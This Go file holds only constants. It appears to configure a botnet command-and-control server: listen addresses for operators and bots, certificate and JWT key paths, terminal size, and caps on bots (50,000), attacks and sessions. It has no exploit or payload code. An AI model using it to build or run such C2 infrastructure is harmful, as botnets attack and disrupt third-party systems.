package main

const (
	usersPath  = "data/json/users.json"
	rbacPath   = "data/json/rbac.json"
	certFile   = "data/certs/server.crt"
	keyFile    = "data/certs/server.key"
	jwtKeyFile = "data/certs/jwt_signing.key"
	logsDir    = "data/logs"
	gifsDir    = "data/gifs"

	listenUser = "192.168.0.11:420"
	listenBot  = "192.168.0.11:7002"
	listenAPI  = "8443"

	termW = 82
	termH = 26
)

// caps on various bounded structures
const (
	capConns       = 1000
	capBots        = 50000
	capSessions    = 10000
	capAuth        = 10000
	capQuota       = 1000
	capHistory     = 10000
	capThrottle    = 50000
	capPool        = 1000
	capAttacks     = 1000
	capAPIAttacks  = 1000
	capPerIP       = 5
)
